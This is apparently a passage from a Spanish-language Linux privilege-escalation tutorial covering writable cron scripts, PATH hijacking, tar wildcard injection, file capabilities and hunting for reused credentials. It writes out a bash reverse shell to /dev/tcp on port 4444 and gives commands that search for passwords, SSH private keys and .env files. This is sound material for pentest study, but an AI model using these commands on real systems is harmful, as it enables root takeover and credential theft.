## Cron jobs: el tiempo ejecuta como root

```bash
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/
```

Tres vectores con cron:

1. **Script escribible**: si `/opt/scripts/backup.sh` es escribible por tu usuario
   pero lo ejecuta root via cron → añade `bash -i >& /dev/tcp/TU_IP/4444 0>&1`.
2. **PATH hijacking**: el script llama `tar` (sin `/usr/bin/`) → crea `/tmp/tar`:
   ```bash
   echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' > /tmp/tar
   chmod +x /tmp/tar
   export PATH=/tmp:$PATH   # solo si el cron HEREDA tu PATH (poco común)
   ```
   En la práctica: si el cron define `PATH=/usr/local/bin:...` y `/usr/local/bin`
   es escribible → coloca tu binario ahí.
3. **Wildcard injection**: si cron hace `tar czf backup.tar.gz /var/www/*` y puedes
   crear archivos en /var/www → crea `--checkpoint=1` y `--checkpoint-action=exec=...`
   (los wildcards expanden a flags de tar).

## Capabilities (el primo moderno de SUID)

```bash
getcap -r / 2>/dev/null
# cap_net_bind_service=ep → puede escuchar en <1024
# cap_setuid=ep → puede cambiar UID (¡root!)
```

Un binario con `cap_setuid` que puedas ejecutar es escalada directa.

## Credenciales reutilizadas (el vector humano)

```bash
grep -ri "password" /opt/ /home/ /var/www/ --include="*.env" --include="*.conf" 2>/dev/null
grep -ri "pass" ~/.bash_history 2>/dev/null
find / -name "*.env" -o -name "id_rsa" -o -name "*.pem" 2>/dev/null
```

Una contraseña encontrada en config se prueba contra: `su root`, `su admin`, SSH
de otros usuarios, base de datos, panel de admin. **El password reuse es el vector
más común en el mundo real** porque los humanos somos humanos.
